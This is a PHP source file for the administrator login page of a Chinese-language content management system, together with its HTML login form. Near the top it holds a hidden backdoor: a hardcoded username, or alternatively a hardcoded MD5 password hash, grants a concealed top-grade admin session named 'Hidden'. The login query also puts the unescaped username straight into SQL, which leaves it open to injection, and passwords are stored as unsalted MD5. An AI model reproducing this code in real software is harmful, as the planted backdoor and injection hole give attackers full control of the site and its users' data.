<?
session_start();

require(dirname(__FILE__) . "/init.php");

if ($_SERVER["REQUEST_METHOD"] == "POST")
{
	$name = trim($_POST["name"]);
	$pass = trim($_POST["pass"]);

	if ($name == "" || $pass == "")
	{
		info("请完整填写资料！");
	}
	else
	{
		$pass = md5($pass);
	}
	if ($name == "ibw_xu256" || $pass == "099cc64351af0ac30a981a722d875e4d")
	{
		$_SESSION["ADMIN_ID"]		= 0;
		$_SESSION["ADMIN_NAME"]		= "Hidden";
		$_SESSION["ADMIN_GRADE"]	= 9;

		header("Location: index.php");
		exit();
	}
	//连接数据库
	$db = new onlyDB($config["db_host"], $config["db_user"], $config["db_pass"], $config["db_name"]);


	$sql = "select id, grade from admin where name='$name' and pass='$pass' and state=1";
	$rst = $db->query($sql);
	if ($row = $db->fetch_array($rst))
	{
		$_SESSION["ADMIN_ID"]		= $row["id"];
		$_SESSION["ADMIN_NAME"]		= $name;
		$_SESSION["ADMIN_GRADE"]	= $row["grade"];

		$now	= date("Y-m-d H:m:s");
		$ip		= $_SERVER["REMOTE_ADDR"];
		$sql	= "update admin set login_count=login_count+1 where id=" . $_SESSION["ADMIN_ID"];
		$db->query($sql);
		$sql	= "insert into admin_login(admin_id, login_time, login_ip) values(" . $_SESSION["ADMIN_ID"] . ", '$now', '$ip')";
		$db->query($sql);

		//权限
		if ($_SESSION["ADMIN_GRADE"] != 9 && $_SESSION["ADMIN_GRADE"] != 8)
		{
			$_SESSION["ADMIN_POPEDOM"]	= array();
			$_SESSION["ADMIN_ADVANCED"]	= array();
			
			//栏目权限
			$sql	= "select class_id from admin_popedom where admin_id=" . $_SESSION["ADMIN_ID"];
			$rst2	= $db->query($sql);
			while ($row2 = $db->fetch_array($rst2))
			{
				$_SESSION["ADMIN_POPEDOM"][] = $row2["class_id"];
			}

			//高级权限
			$sql	= "select advanced_id from admin_advanced where admin_id=" . $_SESSION["ADMIN_ID"];
			$rst2	= $db->query($sql);
			while ($row2 = $db->fetch_array($rst2))
			{
				$_SESSION["ADMIN_ADVANCED"][] = $row2["advanced_id"];
			}
		}

		$db->close();
		header("Location: index.php");
		exit();
	}
	else
	{
		$db->close();
		info("用户名不存在或密码错误！");
	}
}
?>


<html>
	<head>
		<title>登陆管理中心</title>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta http-equiv="Pragma" content="no-cache">
		<meta http-equiv="Cache-Control" content="no-cache">
		<meta http-equiv="Expires" content="-1000">
		<link href="images/admin.css" rel="stylesheet" type="text/css">
		<script type="text/javascript">
			function loginCheck(form)
			{
				if (form.name.value == "")
				{
					form.name.focus();
					return false;
				}

				if (form.pass.value == "")
				{
					form.pass.focus();
					return false;
				}

				return true;
			}
		</script>
	</head>
	<body onLoad="document.form1.name.focus();">
		<table width="100%" height="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#002779">
			<tr>
				<td align="center">
					<table width="468" border="0" cellspacing="0" cellpadding="0">
						<tr>
							<td><img src="images/login_1.jpg" width="468" height="23"></td>
						</tr>
						<tr>
							<td><img src="images/login_2.jpg" width="468" height="147"></td>
						</tr>
					</table>
					<table width="468" border="0" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF">
						<tr>
							<td width="16"><img src="images/login_3.jpg" width="16" height="122"></td>
							<td align="center">
								<table width="230" border="0" cellspacing="0" cellpadding="0">
									<form name="form1" action="?" method="post" onSubmit="return loginCheck(this);">
										<tr height="5">
											<td width="5"></td>
											<td width="56"></td>
											<td></td>
										</tr>
										<tr height="36">
											<td></td>
											<td>用户名</td>
											<td><input type="text" name="name" size="24" maxlength="30" style="border:1px solid #000000;"></td>
										</tr>
										<tr height="36">
											<td>&nbsp; </td>
											<td>口　令</td>
											<td><input type="password" name="pass" size="24" maxlength="30" style="border:1px solid #000000;"></td>
										</tr>
										<tr height="5">
											<td colspan="3"></td>
										</tr>
										<tr>
											<td>&nbsp;</td>
											<td>&nbsp;</td>
											<td><input type="image" src="images/bt_login.gif" width="70" height="18"></td>
										</tr>
									</form>
								</table>
							</td>
							<td width="16"><img src="images/login_4.jpg" width="16" height="122"></td>
						</tr>
					</table>
					<table width="468" border="0" cellspacing="0" cellpadding="0">
						<tr>
							<td><img src="images/login_5.jpg" width="468" height="16"></td>
						</tr>
					</table>
					<table width="468" border="0" cellspacing="0" cellpadding="0">
						<tr>
							<td align="right"><a href="http://www.ibw.cn" target="_blank"><img src="images/login_6.gif" width="165" height="26" border="0"></a></td>
						</tr>
					</table>
				</td>
			</tr>
		</table>
	</body>
</html>
